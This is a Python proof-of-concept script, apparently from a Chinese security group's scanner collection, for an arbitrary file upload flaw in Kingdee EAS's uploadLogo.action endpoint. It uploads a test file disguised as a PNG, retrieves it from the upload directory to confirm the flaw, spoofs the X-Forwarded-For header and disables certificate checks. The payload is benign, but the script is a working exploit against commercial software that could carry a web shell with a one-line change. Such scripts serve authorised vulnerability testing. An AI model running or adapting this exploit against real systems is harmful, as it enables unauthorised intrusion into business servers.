'''
Function:
    金蝶EAS uploadLogo.action文件存在任意文件上传漏洞
Author:
    花果山
Wechat official account：
    中龙 红客突击队
Official website：
    https://www.hscsec.cn/
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import re
import requests
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
        }
        self.value_list = []
        self.result_text = ""
        self.proxies = proxies

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return scheme, netloc

    def vuln(self, netloc, scheme):
        url = "{}://{}/plt_portal/setting/uploadLogo.action".format(scheme, netloc)
        self.headers['X-Forwarded-For'] = netloc
        data = {
            "chooseLanguage_top": 'ch',
            "dataCenter": 'xx',
            "insId": "",
            "type": "top",
            "upload": ("test.txt", b"test", "image/png")
        }
        try:
            result = requests.post(url=url, files=data, headers=self.headers, verify=False, timeout=3, allow_redirects=False, proxies=self.proxies)
            filename_re = re.compile('gp.uploadLogoSuccess\("nullLogo","(.*?)",""\)')
            filename = filename_re.search(result.text).group(1)
            url_test = "{}://{}/portal/res/file/upload/{}".format(scheme, netloc, filename)
            result_end = requests.get(url=url_test, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
            if "test" in result_end.text:
                target = urlparse(url)
                self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意文件上传漏洞\033[0m
                 POST {} HTTP/1.1
                 Host: {}""".format(target.path, target.netloc)
                for request_type, request_text in dict(result.request.headers).items():
                    self.result_text += "\n                 {}: {}".format(request_type, request_text)
                self.result_text += "\n"
                bodys = result.request.body.decode().split("\r\n")
                for body in bodys:
                    self.result_text += "\n                 {}".format(body)
                return True
            else:
                return False
        except:
            return False

    def main(self):
        all = self.host()
        scheme = all[0]
        netloc = all[1]
        if self.vuln(netloc, scheme):
            return self.result_text
        else:
            return False



